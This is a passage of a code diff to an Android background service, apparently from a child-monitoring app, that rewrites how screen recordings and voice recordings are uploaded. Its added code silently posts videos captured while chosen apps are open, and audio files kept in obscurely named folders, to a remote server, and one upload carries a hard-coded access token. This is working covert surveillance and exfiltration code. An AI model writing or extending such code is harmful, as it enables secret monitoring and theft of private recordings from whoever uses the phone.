-                //           Toast.makeText(childService.this, e.toString(), Toast.LENGTH_SHORT).show();
-                            Log.e("324", e.toString() );
-                            e.printStackTrace();
-                        } catch (FileNotFoundException e) {
-                        //    uploading=false;
-                     //       Toast.makeText(childService.this, e.toString(), Toast.LENGTH_SHORT).show();
-                            Log.e("exeption343", e.toString() );
-                            e.printStackTrace();
+                            curdate2 = curedate;
+                            filec = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/" + curedate + ".mp4");
+
+
+                            try {
+                                new Thread(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        HttpClient httpclient = new DefaultHttpClient();
+                                        HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+
+
+                                        try {
+                                            MultipartEntity entity = new MultipartEntity();
+
+                                            try {
+                                                entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                                entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                                entity.addPart("type", new StringBody(pastpkgname, Charset.forName("UTF-8")));
+                                            } catch (UnsupportedEncodingException e) {
+                                                e.printStackTrace();
+                                            }
+                                            //File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
+                                            FileBody fileBody = new FileBody(filec);
+                                            entity.addPart("video", fileBody);
+                                            Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                            //totalSize = entity.getContentLength();
+                                            httppost.setEntity(entity);
+                                            HttpResponse response = httpclient.execute(httppost);
+                                            HttpEntity r_entity = response.getEntity();
+                                            Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                            //responseString = EntityUtils.toString(r_entity);
+
+                                        } catch (ClientProtocolException e) {
+                                            Log.e("terkgkjjgjgj", e.toString());
+                                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                            if (file2.exists()){
+                                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                                try {
+                                                    copy(file2,fileb);
+                                                } catch (IOException ioException) {
+                                                    ioException.printStackTrace();
+                                                }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                            }
+                                            //responseString = e.toString();
+                                        } catch (IOException e) {
+                                            Log.e("terkgkjjgjgj", e.toString());
+                                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                            if (file2.exists()){
+                                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                                try {
+                                                    copy(file2,fileb);
+                                                } catch (IOException ioException) {
+                                                    ioException.printStackTrace();
+                                                }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                            }
+                                            //	responseString = e.toString();
+                                        }
+                                    }
+                                }).start();
+
+
+                            } catch (Exception e) {
+                                Log.e("terkgkjjgjgj", e.toString() );
+                            }
+                        }catch (Exception e){
+                            Log.e("terkgkjjgjgj", e.toString() );
                         }
+
+
+
+
+
+
+
+
+
 //                    stop recording
                     }
                 }
@@ -1110,6 +1402,7 @@ public class childService extends Service implements LocationListener,UploadStat
         }else if (pkg.contains(curpkgname)&&pkg.contains(pastpkgname)){
             //doing nothing
         }else if (!pkg.contains(curpkgname)&&record==true){
+            final String pkgname=pastpkgname;
 
             record=false;
        //     handler23.removeCallbacks(runnable23);
@@ -1129,36 +1422,125 @@ public class childService extends Service implements LocationListener,UploadStat
             try {
                 curdate2=curedate;
                 filec=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curedate+".mp4");
-                String uploadId = UUID.randomUUID().toString();
-                uploadReceiver.setUploadID(uploadId);
-//                Date curDate = new Date(System.currentTimeMillis());
-                Log.e("toooooooooooken", getToken(getApplicationContext()) );
-                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4", "video") //Adding file
-                        .addParameter("token", getToken(getApplicationContext()))
-                        .addParameter("token1", "allow")
-                        .addParameter("type", pastpkgname)//Adding text parameter to the request
-                        .setMaxRetries(2)
-                        .setAutoDeleteFilesAfterSuccessfulUpload(true)
-                        .startUpload(); //Starting the upload
-                 //uploading=true;
-            } catch (MalformedURLException e) {
-             //   uploading=false;
-     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
-                Log.e("exeption343", e.toString() );
-                e.printStackTrace();
-            } catch (FileNotFoundException e) {
-              //  uploading=false;
-     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
-                Log.e("exeption343", e.toString() );
-                e.printStackTrace();
-            }
+
+
+                try {
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            HttpClient httpclient = new DefaultHttpClient();
+                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+
+
+                            try {
+                                MultipartEntity entity = new MultipartEntity();
+
+                                try {
+                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                    entity.addPart("type", new StringBody(pkgname, Charset.forName("UTF-8")));
+                                } catch (UnsupportedEncodingException e) {
+                                    e.printStackTrace();
+                                }
+                                File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4");
+                                FileBody fileBody = new FileBody(myFile);
+                                entity.addPart("video", fileBody);
+                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                //totalSize = entity.getContentLength();
+                                httppost.setEntity(entity);
+                                HttpResponse response = httpclient.execute(httppost);
+                                HttpEntity r_entity = response.getEntity();
+                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                //responseString = EntityUtils.toString(r_entity);
+
+                            } catch (ClientProtocolException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //responseString = e.toString();
+                            } catch (IOException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //	responseString = e.toString();
+                            }
+                        }
+                    }).start();
+
+
+                } catch (Exception e) {
+                }
+            }catch (Exception e){}
+
+
+
+//                String uploadId = UUID.randomUUID().toString();
+//                uploadReceiver.setUploadID(uploadId);
+////                Date curDate = new Date(System.currentTimeMillis());
+//                Log.e("toooooooooooken", getToken(getApplicationContext()) );
+//                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
+//                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4", "video") //Adding file
+//                        .addParameter("token", getToken(getApplicationContext()))
+//                        .addParameter("token1", "allow")
+//                        .addParameter("type", pastpkgname)//Adding text parameter to the request
+//                        .setMaxRetries(2)
+//                        .setAutoDeleteFilesAfterSuccessfulUpload(true)
+//                        .startUpload(); //Starting the upload
+//                 //uploading=true;
+//            } catch (MalformedURLException e) {
+//             //   uploading=false;
+//     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
+//                Log.e("exeption343", e.toString() );
+//                e.printStackTrace();
+//            } catch (FileNotFoundException e) {
+//              //  uploading=false;
+//     //           Toast.makeText(this, e.toString(), Toast.LENGTH_SHORT).show();
+//                Log.e("exeption343", e.toString() );
+//                e.printStackTrace();
+//            }
 //                    stop recording
         }
         pastpkgname=curpkgname;
 
     }
-    @RequiresApi(api = 29)
+
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     public void recored23(String pkgname){
 
         if (curpkgname.equals(pkgname)&&!pastpkgname.equals(pkgname)){
@@ -1182,23 +1564,107 @@ public class childService extends Service implements LocationListener,UploadStat
             destroyMediaProjection();
 //
             try {
-                String uploadId = UUID.randomUUID().toString();
-                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4", "video") //Adding file
-                        .addParameter("token", getToken(getApplicationContext()))
-                        .addParameter("token1", "allow")//Adding text parameter to the request
-                        .setMaxRetries(2)
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        HttpClient httpclient = new DefaultHttpClient();
+                        HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
 
-                        .startUpload(); //Starting the upload
-            } catch (MalformedURLException e) {
-                e.printStackTrace();
-            } catch (FileNotFoundException e) {
-                e.printStackTrace();
-            }
+
+                        try {
+                            MultipartEntity entity = new MultipartEntity();
+
+                            try {
+                                entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                            } catch (UnsupportedEncodingException e) {
+                                e.printStackTrace();
+                            }
+                            File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4");
+                            FileBody fileBody = new FileBody(myFile);
+                            entity.addPart("video", fileBody);
+                            Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                            //totalSize = entity.getContentLength();
+                            httppost.setEntity(entity);
+                            HttpResponse response = httpclient.execute(httppost);
+                            HttpEntity r_entity = response.getEntity();
+                            Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                            //responseString = EntityUtils.toString(r_entity);
+
+                        } catch (ClientProtocolException e) {
+                            Log.e("terkgkjjgjgj", e.toString());
+                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                            if (file2.exists()){
+                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                try {
+                                    copy(file2,fileb);
+                                } catch (IOException ioException) {
+                                    ioException.printStackTrace();
+                                }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                            }
+                            //responseString = e.toString();
+                        } catch (IOException e) {
+                            Log.e("terkgkjjgjgj", e.toString());
+                            File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                            if (file2.exists()){
+                                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                try {
+                                    copy(file2,fileb);
+                                } catch (IOException ioException) {
+                                    ioException.printStackTrace();
+                                }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                            }
+                            //	responseString = e.toString();
+                        }
+                    }
+                }).start();
+
+            }catch (Exception e){}
+
+
+
+
+//            try {
+//                String uploadId = UUID.randomUUID().toString();
+//                new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
+//                        .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/a.mp4", "video") //Adding file
+//                        .addParameter("token", getToken(getApplicationContext()))
+//                        .addParameter("token1", "allow")//Adding text parameter to the request
+//                        .setMaxRetries(2)
+//
+//                        .startUpload(); //Starting the upload
+//            } catch (MalformedURLException e) {
+//                e.printStackTrace();
+//            } catch (FileNotFoundException e) {
+//                e.printStackTrace();
+//            }
 //                    stop recording
         }
         pastpkgname=curpkgname;
     }
+    @TargetApi(Build.VERSION_CODES.KITKAT)
     public void copy(File src, File dst) throws IOException {
         try {
 
@@ -1224,46 +1690,289 @@ public class childService extends Service implements LocationListener,UploadStat
     public void uploadfirstvoicefile(){
         File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/45854455555/");
         if (directory.exists()){
-            File[] fileses = directory.listFiles();
+            final File[] fileses = directory.listFiles();
             if (fileses.length>0){
                 String uploadId = UUID.randomUUID().toString();
-                try {
-                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-voice/")
-                            .addFileToUpload(fileses[0].getPath(), "voice") //Adding file
-                            .addParameter("token", getToken(getApplicationContext()))
-                            .addParameter("token1", "AllowVoice")//Adding text parameter to the request
-                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
-                            .setMaxRetries(2)
 
-                            .startUpload(); //Starting the upload
-                } catch (FileNotFoundException e) {
-                    e.printStackTrace();
-                } catch (MalformedURLException e) {
-                    e.printStackTrace();
-                }
+                try {
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            HttpClient httpclient = new DefaultHttpClient();
+                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");
+
+
+                            try {
+                                MultipartEntity entity = new MultipartEntity();
+
+                                try {
+                                    entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
+                                    entity.addPart("token", new StringBody("fb6741b31cb02c6079a542083b6a46a8", Charset.forName("UTF-8")));
+                                } catch (UnsupportedEncodingException e) {
+                                    e.printStackTrace();
+                                }
+                                //  File myFile = new File(path);
+                                FileBody fileBody = new FileBody(fileses[0]);
+                                entity.addPart("video", fileBody);
+                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                //totalSize = entity.getContentLength();
+                                httppost.setEntity(entity);
+                                HttpResponse response = httpclient.execute(httppost);
+                                HttpEntity r_entity = response.getEntity();
+                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                //responseString = EntityUtils.toString(r_entity);
+
+                            } catch (ClientProtocolException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //responseString = e.toString();
+                            } catch (IOException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //	responseString = e.toString();
+                            }
+                        }
+                    }).start();
+
+                }catch (Exception e){}
+
+                try {
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            HttpClient httpclient = new DefaultHttpClient();
+                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");
+
+
+                            try {
+                                MultipartEntity entity = new MultipartEntity();
+
+                                try {
+                                    entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
+                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                } catch (UnsupportedEncodingException e) {
+                                    e.printStackTrace();
+                                }
+                                // File myFile = new File(path);
+                                FileBody fileBody = new FileBody(fileses[0]);
+                                entity.addPart("voice", fileBody);
+                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                //totalSize = entity.getContentLength();
+                                httppost.setEntity(entity);
+                                HttpResponse response = httpclient.execute(httppost);
+                                HttpEntity r_entity = response.getEntity();
+                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                //responseString = EntityUtils.toString(r_entity);
+
+                            } catch (ClientProtocolException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //responseString = e.toString();
+                            } catch (IOException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //	responseString = e.toString();
+                            }
+                        }
+                    }).start();
+
+                }catch (Exception e){}
+
+
+//                try {
+//                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-voice/")
+//                            .addFileToUpload(fileses[0].getPath(), "voice") //Adding file
+//                            .addParameter("token", getToken(getApplicationContext()))
+//                            .addParameter("token1", "AllowVoice")//Adding text parameter to the request
+//                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
+//                            .setMaxRetries(2)
+//
+//                            .startUpload(); //Starting the upload
+//                } catch (FileNotFoundException e) {
+//                    e.printStackTrace();
+//                } catch (MalformedURLException e) {
+//                    e.printStackTrace();
+//                }
             }
         }
     }
     public void uploadfirstvoicefile2(){
         File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/458544555433/");
         if (directory.exists()){
-            File[] fileses = directory.listFiles();
+            final File[] fileses = directory.listFiles();
             if (fileses.length>0){
-                String uploadId = UUID.randomUUID().toString();
-                try {
-                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                            .addFileToUpload(fileses[0].getPath(), "video") //Adding file
-                            .addParameter("token", getToken(getApplicationContext()))
-                            .addParameter("token1", "allow")//Adding text parameter to the request
-                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
-                            .setMaxRetries(2)
 
-                            .startUpload(); //Starting the upload
-                } catch (FileNotFoundException e) {
-                    e.printStackTrace();
-                } catch (MalformedURLException e) {
-                    e.printStackTrace();
-                }
+                try {
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            HttpClient httpclient = new DefaultHttpClient();
+                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+
+
+                            try {
+                                MultipartEntity entity = new MultipartEntity();
+
+                                try {
+                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                } catch (UnsupportedEncodingException e) {
+                                    e.printStackTrace();
+                                }
+                                //File myFile = new File(path);
+                                FileBody fileBody = new FileBody(fileses[0]);
+                                entity.addPart("video", fileBody);
+                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                //totalSize = entity.getContentLength();
+                                httppost.setEntity(entity);
+                                HttpResponse response = httpclient.execute(httppost);
+                                HttpEntity r_entity = response.getEntity();
+                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                //responseString = EntityUtils.toString(r_entity);
+
+                            } catch (ClientProtocolException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //responseString = e.toString();
+                            } catch (IOException e) {
+                                Log.e("terkgkjjgjgj", e.toString());
+                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                if (file2.exists()){
+                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                    try {
+                                        copy(file2,fileb);
+                                    } catch (IOException ioException) {
+                                        ioException.printStackTrace();
+                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                }
+                                //	responseString = e.toString();
+                            }
+                        }
+                    }).start();
+
+                }catch (Exception e){}
+
+//                String uploadId = UUID.randomUUID().toString();
+//                try {
+//                    new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
+//                            .addFileToUpload(fileses[0].getPath(), "video") //Adding file
+//                            .addParameter("token", getToken(getApplicationContext()))
+//                            .addParameter("token1", "allow")//Adding text parameter to the request
+//                            .setAutoDeleteFilesAfterSuccessfulUpload(true)
+//                            .setMaxRetries(2)
+//
+//                            .startUpload(); //Starting the upload
+//                } catch (FileNotFoundException e) {
+//                    e.printStackTrace();
+//                } catch (MalformedURLException e) {
+//                    e.printStackTrace();
+//                }
             }
         }
     }
